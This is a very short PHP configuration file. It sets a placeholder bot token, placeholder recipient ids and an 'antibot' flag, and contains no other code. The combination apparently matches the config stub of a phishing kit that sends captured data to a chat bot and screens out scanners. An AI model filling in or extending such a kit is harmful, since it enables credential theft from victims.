<?php 
 


$bot = "your-token";
$ids = array("id1", "id2");

$antibot = "yes";


?>